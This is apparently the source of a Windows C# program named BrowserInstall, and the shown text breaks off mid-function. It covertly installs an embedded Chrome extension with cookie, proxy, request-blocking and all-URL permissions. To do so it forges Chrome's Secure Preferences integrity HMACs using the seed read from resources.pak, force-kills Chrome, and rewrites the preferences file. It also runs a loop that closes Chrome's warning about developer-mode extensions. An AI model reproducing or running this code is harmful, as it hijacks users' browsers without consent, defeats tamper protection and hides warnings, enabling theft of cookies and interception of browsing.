using System;
using System.Collections.Generic;
using System.Threading;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections;
using System.Reflection;
using System.Runtime.Serialization;
using Microsoft.Win32;
namespace BrowserInstall
{
    class Program
    {


        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern int GetComputerName(StringBuilder lpBuffer, ref int lpnSize);
        const int NO_ERROR = 0;
        const int ERROR_INSUFFICIENT_BUFFER = 122;
        const int ERROR_INVALID_FLAGS = 1004; // On Windows Server 2003 this error is/can be returned, but processing can still continue

        enum SID_NAME_USE
        {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool LookupAccountName(
            string lpSystemName,
            string lpAccountName,
            [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
            ref uint cbSid,
            StringBuilder ReferencedDomainName,
            ref uint cchReferencedDomainName,
            out SID_NAME_USE peUse);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(
            [MarshalAs(UnmanagedType.LPArray)] byte[] pSID,
            out IntPtr ptrSid);
        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);


        [Flags]
        public enum FileSystemFeature : uint
        {
            /// <summary>
            /// The file system preserves the case of file names when it places a name on disk.
            /// </summary>
            CasePreservedNames = 2,

            /// <summary>
            /// The file system supports case-sensitive file names.
            /// </summary>
            CaseSensitiveSearch = 1,

            /// <summary>
            /// The specified volume is a direct access (DAX) volume. This flag was introduced in Windows 10, version 1607.
            /// </summary>
            DaxVolume = 0x20000000,

            /// <summary>
            /// The file system supports file-based compression.
            /// </summary>
            FileCompression = 0x10,

            /// <summary>
            /// The file system supports named streams.
            /// </summary>
            NamedStreams = 0x40000,

            /// <summary>
            /// The file system preserves and enforces access control lists (ACL).
            /// </summary>
            PersistentACLS = 8,

            /// <summary>
            /// The specified volume is read-only.
            /// </summary>
            ReadOnlyVolume = 0x80000,

            /// <summary>
            /// The volume supports a single sequential write.
            /// </summary>
            SequentialWriteOnce = 0x100000,

            /// <summary>
            /// The file system supports the Encrypted File System (EFS).
            /// </summary>
            SupportsEncryption = 0x20000,

            /// <summary>
            /// The specified volume supports extended attributes. An extended attribute is a piece of
            /// application-specific metadata that an application can associate with a file and is not part
            /// of the file's data.
            /// </summary>
            SupportsExtendedAttributes = 0x00800000,

            /// <summary>
            /// The specified volume supports hard links. For more information, see Hard Links and Junctions.
            /// </summary>
            SupportsHardLinks = 0x00400000,

            /// <summary>
            /// The file system supports object identifiers.
            /// </summary>
            SupportsObjectIDs = 0x10000,

            /// <summary>
            /// The file system supports open by FileID. For more information, see FILE_ID_BOTH_DIR_INFO.
            /// </summary>
            SupportsOpenByFileId = 0x01000000,

            /// <summary>
            /// The file system supports re-parse points.
            /// </summary>
            SupportsReparsePoints = 0x80,

            /// <summary>
            /// The file system supports sparse files.
            /// </summary>
            SupportsSparseFiles = 0x40,

            /// <summary>
            /// The volume supports transactions.
            /// </summary>
            SupportsTransactions = 0x200000,

            /// <summary>
            /// The specified volume supports update sequence number (USN) journals. For more information,
            /// see Change Journal Records.
            /// </summary>
            SupportsUsnJournal = 0x02000000,

            /// <summary>
            /// The file system supports Unicode in file names as they appear on disk.
            /// </summary>
            UnicodeOnDisk = 4,

            /// <summary>
            /// The specified volume is a compressed volume, for example, a DoubleSpace volume.
            /// </summary>
            VolumeIsCompressed = 0x8000,

            /// <summary>
            /// The file system supports disk quotas.
            /// </summary>
            VolumeQuotas = 0x20
        }
        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public extern static bool GetVolumeInformation(
   string rootPathName,
   StringBuilder volumeNameBuffer,
   int volumeNameSize,
   out uint volumeSerialNumber,
   out uint maximumComponentLength,
   out FileSystemFeature fileSystemFlags,
   StringBuilder fileSystemNameBuffer,
   int nFileSystemNameSize);

        static string sid, sid_hash;


        public static class Crc8
        {
            static byte[] table =  {
                0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
                0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
                0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
                0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
                0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
                0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
                0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
                0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
                0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
                0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
                0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
                0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
                0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
                0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
                0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
                0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
                0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
                0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
                0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
                0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
                0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
                0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
                0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
                0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
                0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
                0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
                0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
                0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
                0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
                0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
                0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
                0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
            };
            public static byte Gen(byte[] data)
            {
                byte ress = 0;
                byte crc = 0;
                for (int i = 0; i < data.Length; i++)
                {
                    crc = table[(data[i] ^ crc) & 0xFF];
                }
                ress = crc;
                byte x = 0x55;
                return (byte)(ress ^ x);
            }
        }

        public static string ComputeHash(byte[] key, string path, string val)
        {
            HMACSHA256 hm = new HMACSHA256(key);
            byte[] hashBytes = hm.ComputeHash(Encoding.ASCII.GetBytes(sid + path + val.Replace("<", "\\u003C")));
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < hashBytes.Length; i++)
                sb.Append(hashBytes[i].ToString("X2"));
            return sb.ToString();
        }
        public static byte[] GetSeed(string resources_pak)
        {
            //Open stream
            using (FileStream fs = File.OpenRead(resources_pak))
            using (BinaryReader reader = new BinaryReader(fs))
            {
                // Read in all pairs.
                //4 bytes - Version (Assume, that is 5 or 4)
                int version = reader.ReadInt32();
                int second_dword = reader.ReadInt32();
                int count = 0;
                if (version == 0x05)
                {
                    count = (reader.ReadUInt16()) + 1;
                    reader.ReadUInt16();
                }
                else
                {
                    count = second_dword;
                    //Skip useless byte
                    reader.ReadByte();
                }

                uint last_offset = (uint)(count) * 6 + (uint)fs.Position;
                for (int i = 0; i < count; i++)
                {
                    //Word: ID
                    uint id = (uint)reader.ReadInt16();
                    //DWord: Offset from file start
                    uint offset = (reader.ReadUInt32());
                    //Assume, that seed_ is 64 bytes long
                    if (offset - last_offset == 64)
                    {
                        //Save last position in file
                        long last = fs.Position;
                        //Go to section position
                        fs.Seek(last_offset, SeekOrigin.Begin);
                        //Allocate space
                        uint want = offset - last_offset;
                        byte[] u = new byte[want];
                        for (int o = 0; o < want; o++)
                            u[o] = reader.ReadByte();
                        //Return carret back
                        fs.Seek(last, SeekOrigin.Begin);
                        return u;

                    }
                    last_offset = offset;
                }
            }
            return null;
        }

        static byte[] Hash(string input)
        {
            using (SHA1Managed sha1 = new SHA1Managed())
            {
                return sha1.ComputeHash(Encoding.Unicode.GetBytes(input));
            }
        }


        public static string GetMachineId()
        {
            string dir = Environment.SystemDirectory;
            dir = dir.Substring(0, dir.IndexOf("\\") + 1);

            StringBuilder volname = new StringBuilder(261);
            StringBuilder fsname = new StringBuilder(261);
            if (!GetVolumeInformation(dir, volname, volname.Capacity, out uint sernum, out uint maxlen, out FileSystemFeature flags, fsname, fsname.Capacity))
                Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
            byte[] sid_str = (Hash(sid));
            byte[] bts = new byte[sid_str.Length + 4];

            for (int i = 0; i < sid_str.Length; i++)
                bts[i] = sid_str[i];
            for (int i = 0; i < sizeof(int); i++)
            {
                int shift_bits = 8 * (sizeof(int) - i - 1);
                bts[sid_str.Length + i] = (byte)((sernum >> shift_bits) & 0xFF);
            }
            byte b = Crc8.Gen(bts);
            var sb = new StringBuilder(bts.Length + 1);

            foreach (byte bb in bts)
                sb.Append(bb.ToString("X2"));
            sb.Append(b.ToString("X2"));
            return sb.ToString();

        }
        static byte[] seed_;
        public delegate bool CallBackPtr(int hwnd, int lParam);
        private static CallBackPtr callBackPtr = new CallBackPtr(EnumReport.Report);
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
        static string GetClassNameOfWindow(IntPtr hwnd)
        {
            string className = "";
            StringBuilder classText = null;
            try
            {
                int cls_max_length = 1000;
                classText = new StringBuilder("", cls_max_length + 5);
                GetClassName(hwnd, classText, cls_max_length + 2);

                if (!String.IsNullOrEmpty(classText.ToString()) && !String.IsNullOrWhiteSpace(classText.ToString()))
                    className = classText.ToString();
            }
            catch (Exception ex)
            {
                className = ex.Message;
            }
            finally
            {
                classText = null;
            }
            return className;
        }
        static List<String> names = new List<string> { "Отключение расширений в режиме разработчика", };
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
        [DllImport("user32")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumChildWindows(IntPtr window, EnumWindowProc callback, IntPtr i);
        public static List<IntPtr> GetChildWindows(IntPtr parent)
        {
            List<IntPtr> result = new List<IntPtr>();
            GCHandle listHandle = GCHandle.Alloc(result);
            try
            {
                EnumWindowProc childProc = new EnumWindowProc(EnumWindow);
                EnumChildWindows(parent, childProc, GCHandle.ToIntPtr(listHandle));
            }
            finally
            {
                if (listHandle.IsAllocated)
                    listHandle.Free();
            }
            return result;
        }
        private static bool EnumWindow(IntPtr handle, IntPtr pointer)
        {
            GCHandle gch = GCHandle.FromIntPtr(pointer);
            List<IntPtr> list = gch.Target as List<IntPtr>;
            if (list == null)
            {
                throw new InvalidCastException("GCHandle Target could not be cast as List<IntPtr>");
            }
            list.Add(handle);
            //  You can modify this to check to see if you want to cancel the operation, then return a null here
            return true;
        }

        /// <summary>
        /// Delegate for the EnumChildWindows method
        /// </summary>
        /// <param name="hWnd">Window handle</param>
        /// <param name="parameter">Caller-defined variable; we use it for a pointer to our list</param>
        /// <returns>True to continue enumerating, false to bail.</returns>
        public delegate bool EnumWindowProc(IntPtr hWnd, IntPtr parameter);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        const UInt32 WM_CLOSE = 0x0010;
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public static class EnumReport
        {
            [DllImport("user32.dll")]
            public static extern int EnumWindows(CallBackPtr callPtr, int lPar);

            public static bool Report(int hwnd, int lParam)
            {
                const int nChars = 256;
                StringBuilder Buff = new StringBuilder(nChars);
                try
                {
                    var watch = System.Diagnostics.Stopwatch.StartNew();
                    if (GetWindowThreadProcessId((IntPtr)hwnd, out uint id) != 0)
                    {
                        string abc = Process.GetProcessById((int)id).ProcessName;
                        if (abc == "chrome")
                            if (GetWindowText((IntPtr)hwnd, Buff, nChars) > 0)
                            {
                                string name = Buff.ToString();
                                if (names.Contains(name))
                                {
                                    SendMessage((IntPtr)hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                                }

                                Console.WriteLine(name); ;
                            }
                    }
                    watch.Stop();
                    var elapsedMs = watch.ElapsedMilliseconds;
                    Console.WriteLine(elapsedMs);
                }
                catch
                {

                }
                return true;
            }
        }
        public static string GetSID()
        {
            StringBuilder sb = new StringBuilder(260);
            int size = 260;

            GetComputerName(sb, ref size);
            byte[] Sid = null;
            uint cbSid = 0;
            string accountName = sb.ToString();
            StringBuilder referencedDomainName = new StringBuilder();
            uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
            int err = NO_ERROR;
            if (!LookupAccountName(null, accountName, Sid, ref cbSid, referencedDomainName, ref cchReferencedDomainName, out SID_NAME_USE sidUse))
            {
                err = Marshal.GetLastWin32Error();
                if (err == ERROR_INSUFFICIENT_BUFFER || err == ERROR_INVALID_FLAGS)
                {
                    Sid = new byte[cbSid];
                    referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
                    err = NO_ERROR;
                    if (!LookupAccountName(null, accountName, Sid, ref cbSid, referencedDomainName, ref cchReferencedDomainName, out sidUse))
                        err = Marshal.GetLastWin32Error();
                }
            }
            else
            {
                // Consider throwing an exception since no result was found
            }
            if (err == 0)
            {
                if (!ConvertSidToStringSid(Sid, out IntPtr ptrSid))
                {
                    err = Marshal.GetLastWin32Error();
                    // Console.WriteLine(@"Could not convert sid to string. Error : {0}", err);
                }
                else
                {
                    string sidString = Marshal.PtrToStringAuto(ptrSid);
                    LocalFree(ptrSid);
                    return sidString;
                    // Console.WriteLine(@"Found sid {0} : {1}", sidUse, sidString);
                }
            }
            return null;
        }



        static string preferences = "";

        public static object GetValue(object a, string path)
        {
            path += ".";
            var op = a;
            while (path.IndexOf(".") != -1)
            {
                Dictionary<String, Object> u = (Dictionary<String, Object>)op;
                string k = path.Substring(0, path.IndexOf("."));
                if (u.ContainsKey(k))
                {
                    op = u[k];
                    path = path.Substring(path.IndexOf(".") + 1);
                }
                else
                {
                    return null;
                }
            }
            return op;
        }

        public static string Serialize(object a)
        {
            string res = ""; if (a == null) return null;
            if (a.GetType() != typeof(Dictionary<String, Object>))
            {
                if (a != null && a.GetType() == typeof(bool))
                    res += ((bool)a == true ? "true" : "false");
                else if (a != null && a.GetType() != typeof(string) && a.GetType() != typeof(bool))
                    res += a.ToString();
                else if (a != null && a.GetType() == typeof(string))
                    res += "\"" + a.ToString() + "\"";
                return res;
            }
            Dictionary<String, Object> dc = (Dictionary<String, Object>)a;
            if (dc.Count == 0)
                return "";
            foreach (var u in dc)
            {

                if (u.Value.GetType() == typeof(Dictionary<String, Object>))
                {
                    string ups = Serialize(u.Value);
                    if (ups != "")
                        res += "\"" + u.Key + "\":" + Serialize(u.Value) + ",";
                }
                else
                if (u.Value.GetType() == typeof(List<Object>))
                {
                    string res1 = "\"" + u.Key + "\":[";
                    bool io = true;
                    foreach (var el in (List<Object>)u.Value)
                    {
                        string ups = Serialize(el);
                        if (ups != "")
                        {
                            res1 += ups + ",";
                            io = false;
                        }
                    }
                    if (!io)
                        res1 = res1.Substring(0, res1.Length - 1);
                    res1 += "],";
                    if (!io)
                        res += res1;
                }
                else if (u.Value != null && u.Value.GetType() == typeof(bool))
                    res += "\"" + u.Key + "\":" + ((bool)u.Value == true ? "true" : "false") + ",";
                else if (u.Value != null && u.Value.GetType() != typeof(string) && u.Value.GetType() != typeof(bool))
                    res += "\"" + u.Key + "\":" + u.Value.ToString() + ",";
                else if (u.Value != null && u.Value.GetType() == typeof(string))
                    res += "\"" + u.Key + "\":\"" + u.Value.ToString().Replace("\\", "\\\\") + "\",";


            }
            if (res == "")
                return res;
            res = res.Substring(0, res.Length - 1);
            return "{" + res + "}";
        }
        public static string Serialize1(object a)
        {
            string res = ""; if (a == null) return "{}";
            if (a != null && a.GetType() != typeof(Dictionary<String, Object>))
            {
                if (a != null && a.GetType() == typeof(bool))
                    res += ((bool)a == true ? "true" : "false");
                else if (a != null && a.GetType() != typeof(string) && a.GetType() != typeof(bool))
                    res += a.ToString();
                else if (a != null && a.GetType() == typeof(string))
                    res += "" + a.ToString() + "";
                return res;
            }
            Dictionary<String, Object> dc = (Dictionary<String, Object>)a;
            if (dc.Count == 0)
                return "";
            foreach (var u in dc)
            {

                if (u.Value.GetType() == typeof(Dictionary<String, Object>))
                {
                    string ups = Serialize1(u.Value);
                    if (ups != "")
                        res += "\"" + u.Key + "\":" + ups + ",";
                }
                else
                if (u.Value.GetType() == typeof(List<Object>))
                {
                    string res1 = "\"" + u.Key + "\":[";
                    foreach (var el in (List<Object>)u.Value)
                    {
                        string ups = Serialize1(u.Value);
                        if (ups != "")
                        {
                            res1 += ups + ",";
                        }
                    }
                    res1 += "],";
                    res += res1;
                }
                else if (u.Value != null && u.Value.GetType() == typeof(bool))
                    res += "\"" + u.Key + "\":" + ((bool)u.Value == true ? "true" : "false") + ",";
                else if (u.Value != null && u.Value.GetType() != typeof(string) && u.Value.GetType() != typeof(bool))
                    res += "\"" + u.Key + "\":" + u.Value.ToString() + ",";
                else if (u.Value != null && u.Value.GetType() == typeof(string))
                    res += "\"" + u.Key + "\":\"" + u.Value.ToString() + "\",";
                else
                    res += "\"" + u.Key + "\":{},";

            }
            if (res == "")
                return res;
            res = res.Substring(0, res.Length - 1);
            return "{" + res + "}";
        }
        public static string GetSecure(string path)
        {
            var u = JSONParser.FromJson<Object>(preferences);
            var uu = Serialize(GetValue(u, path));
            return uu;
        }

        public static void UpdateSecure(string browser_path, string path, string value)
        {
            if (seed_ == null)
                seed_ = GetSeed(browser_path + "\\resources.pak");
            string hash_file = ComputeHash(seed_, path, value);
            string hash_registry = ComputeHash(Encoding.ASCII.GetBytes("ChromeRegistryHashStoreValidationSeed"), path, value);


        }

        public static bool CheckHmacs(string browser_path)
        {
            if (seed_ == null)
                seed_ = GetSeed(browser_path + "\\resources.pak");
            string hash_file = ComputeHash(seed_, "", GetSecure("protection.macs"));
            return (hash_file) == (GetSecure("protection.super_mac"));
        }

        public static object ReadReg(string path, string key)
        {
            return Registry.GetValue(path, key, null);
        }
        static string ProgramFilesx86()
        {
            if (8 == IntPtr.Size
                || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
            {
                return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
            }

            return Environment.GetEnvironmentVariable("ProgramFiles");
        }

        public static string GenerateID()
        {
            Random r = new Random();
            var res = "";
            for (int i = 0; i < 32; i++)
                res += (char)(r.Next(26) + 'a');
            return res;
        }

        public static string SetValue(string json, string path, string val)
        {
            var u = JSONParser.FromJson<Object>(json);

            path += ".";
            var last = u;
            var op = u;
            string cur = "";
            var v = JSONParser.FromJson<Object>(val);
            if (v == null || (v.GetType() == typeof(int) && (int)v == 0))
            {
                v = val;
            }
            while (path.IndexOf(".") != -1)
            {
                Dictionary<String, Object> dc = (Dictionary<String, Object>)op;
                cur = path.Substring(0, path.IndexOf("."));
                path = path.Substring(path.IndexOf(".") + 1);
                last = op;
                if (!dc.ContainsKey(cur) && path.IndexOf(".") == -1)
                {
                    dc[cur] = v;
                }
                else
                if (dc.ContainsKey(cur) && path.IndexOf(".") != -1)
                {
                    op = dc[cur];
                }
                else
                {
                    dc[cur] = v;
                }

            }
            return JSONWriter.ToJson(u);
        }
        static void Extract(string where, string folder, string res)
        {
            const string nameSpace = "BrowserInstall";
            Assembly assembly = Assembly.GetCallingAssembly();
            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (folder == "" ? "" : folder + ".") + res))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(where + "\\" + res, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public static string Unzip()
        {
            string zipPath = @"c:\example\result.zip";
            string name = "\\_secure_prefences";
            string ids = "\\";
            Random r = new Random();
            for (int i = 0; i < 32; i++)
                ids += (char)(r.Next(26) + 'a');
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + name);
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + name + ids);

            string extractPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + name + ids;
            Extract(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + name, "file", "1.crx");
            zipPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + name + "\\1.crx";
            System.IO.Compression.ZipFile.ExtractToDirectory(zipPath, extractPath);
            return extractPath;
        }

        [DllImport("kernel32.dll", EntryPoint = "RtlCopyMemory")]
        static extern void CopyMemory(byte[] destination, IntPtr source, uint length);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct SystemHandleInformation
        { // Information Class 16
            public int ProcessID;
            public byte ObjectTypeNumber;
            public byte Flags; // 0x01 = PROTECT_FROM_CLOSE, 0x02 = INHERIT
            public ushort Handle;
            public int Object_Pointer;
            public UInt32 GrantedAccess;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RM_UNIQUE_PROCESS
        {
            public int dwProcessId;
            public System.Runtime.InteropServices.ComTypes.FILETIME ProcessStartTime;
        }

        const int RmRebootReasonNone = 0;
        const int CCH_RM_MAX_APP_NAME = 255;
        const int CCH_RM_MAX_SVC_NAME = 63;

        public enum RM_APP_TYPE
        {
            RmUnknownApp = 0,
            RmMainWindow = 1,
            RmOtherWindow = 2,
            RmService = 3,
            RmExplorer = 4,
            RmConsole = 5,
            RmCritical = 1000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct RM_PROCESS_INFO
        {
            public RM_UNIQUE_PROCESS Process;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_APP_NAME + 1)] public string strAppName;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_SVC_NAME + 1)] public string strServiceShortName;

            public RM_APP_TYPE ApplicationType;
            public uint AppStatus;
            public uint TSSessionId;
            [MarshalAs(UnmanagedType.Bool)] public bool bRestartable;
        }

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
        static extern int RmRegisterResources(uint pSessionHandle, uint nFiles, string[] rgsFilenames,
            uint nApplications, [In] RM_UNIQUE_PROCESS[] rgApplications, uint nServices,
            string[] rgsServiceNames);

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Auto)]
        static extern int RmStartSession(out uint pSessionHandle, int dwSessionFlags, string strSessionKey);

        [DllImport("rstrtmgr.dll")]
        static extern int RmEndSession(uint pSessionHandle);

        [DllImport("rstrtmgr.dll")]
        static extern int RmGetList(uint dwSessionHandle, out uint pnProcInfoNeeded,
            ref uint pnProcInfo, [In, Out] RM_PROCESS_INFO[] rgAffectedApps,
            ref uint lpdwRebootReasons);
        static bool Is64Bits()
        {
            return Marshal.SizeOf(typeof(IntPtr)) == 8;
        }
        public static void Install()
        {
            string path = Unzip();
            string id = "";
            //path = "abfztoigvhidkvmimtuyxrxzfnxuohiw";
            while (true)
            {
                id = GenerateID();
                var u = GetSecure("extensions.settings." + id);
                if (u == null)
                    break;
            }
            string flags = "" + ((1 << 7) | (1 << 2));
            string loc = "4";
            id = "dblokgoogmhjemeebajnamjdmloolcjd";
            string setting = "{\"active_permissions\":{\"api\":[\"cookies\",\"notifications\",\"privacy\",\"proxy\",\"storage\",\"tabs\",\"webNavigation\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"<all_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"manifest_permissions\":[],\"scriptable_host\":[\"*://*/*\"]},\"commands\":{},\"content_settings\":[],\"creation_flags\":" + flags + ",\"events\":[],\"from_bookmark\":false,\"from_webstore\":false,\"granted_permissions\":{\"api\":[\"cookies\",\"notifications\",\"privacy\",\"proxy\",\"storage\",\"tabs\",\"webNavigation\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"manifest_permissions\":[],\"scriptable_host\":[\"*://*/*\"]},\"incognito_content_settings\":[],\"incognito_preferences\":{},\"install_time\":\"13192750730879211\",\"last_activated_ime_engine\":false,\"location\":" + loc + ",\"never_activated_since_loaded\":false,\"newAllowFileAccess\":true,\"path\":\"" + path.Replace("\\", "\\\\") + "\",\"preferences\":{\"webrtc.ip_handling_policy\":\"disable_non_proxied_udp\"},\"regular_only_preferences\":{},\"state\":1,\"was_installed_by_default\":true,\"was_installed_by_oem\":false}";

            preferences = SetValue(preferences, "extensions.settings." + id, setting.Replace("<", "\\u003C"));
            preferences = SetValue(preferences, "protection.macs.extensions.settings." + id, ComputeHash(seed_, "extensions.settings." + id, Serialize(JSONParser.ParseValue(typeof(object), setting))));
            //Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Google\\Chrome\\ExtensionInstallWhitelist", "1", id);
            string abc = "HKEY_CURRENT_USER\\Software\\Google\\Chrome\\PreferenceMACs\\Default\\extensions.settings";
            string reg_key = ComputeHash(Encoding.ASCII.GetBytes("ChromeRegistryHashStoreValidationSeed"), "extensions.settings." + id, Serialize(JSONParser.ParseValue(typeof(object), setting)));
            Registry.SetValue(abc, id, reg_key);
            string macs = GetSecure("protection.macs");
            preferences = SetValue(preferences, "protection.super_mac", ComputeHash(seed_, "", macs));

            Process[] processs = System.Diagnostics.Process.GetProcessesByName("ProcessWithFile");

            foreach (var p in processs)
            {

            }
            try
            {

                Process process = new Process();

                // Stop the process from opening a new window
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                // Setup executable and parameters
                process.StartInfo.FileName = @"taskkill.exe";
                process.StartInfo.Arguments = "/im chrome.exe /f";


                // Go
                process.Start();
                process.WaitForExit();
                Thread.Sleep(150);
                throw new Exception();
            }
            catch { }
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Secure Preferences", preferences);

        }


        public delegate bool Win32Callback(IntPtr hwnd, IntPtr lParam);

        [DllImport("user32.Dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumChildWindows(IntPtr parentHandle, Win32Callback callback, IntPtr lParam);
        // When you don't want the ProcessId, use this overload and pass IntPtr.Zero for the second parameter
        [DllImport("user32.dll")]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);
        [DllImport("psapi.dll")]
        private static extern uint GetModuleFileNameEx(IntPtr hWnd, IntPtr hModule, StringBuilder lpFileName, int nSize);
        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr handle);
        public static void CheckWindows()
        {
            while (true)
            {
                Process[] pcs = Process.GetProcessesByName("chrome");
                if (pcs.Length > 0)
                {
                    List<IntPtr> ww = GetChildWindows(IntPtr.Zero);

                    foreach (var hwnd in ww)
                    {
                        try
                        {
                            //List<IntPtr> w = GetChildWindows(p.Handle);
                            GetWindowThreadProcessId(hwnd, out uint pidd);
                            IntPtr pid = (IntPtr)pidd;

                            IntPtr hProcess = OpenProcess(0x0410, false, pidd);

                            StringBuilder text = new StringBuilder(1000);
                            //GetModuleBaseName(hProcess, IntPtr.Zero, text, text.Capacity);
                            GetModuleFileNameEx(hProcess, IntPtr.Zero, text, text.Capacity);

                            CloseHandle(hProcess);

                            if (!text.ToString().EndsWith("chrome.exe"))
                                continue;
                            const int nChars = 256;
                            StringBuilder Buff = new StringBuilder(nChars);
                            if (GetWindowText(hwnd, Buff, nChars) > 0)
                            {
                                string name = Buff.ToString();
                                if (names.Contains(name))
                                {
                                    SendMessage((IntPtr)hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                                    //ShowWindow((IntPtr)hwnd, 0);
                                }

                            }
                            Thread.Sleep(1);


                        }
                        catch
                        {
                            //EnumReport.EnumWindows(callBackPtr, 0);
                            //Thread.Sleep(1);
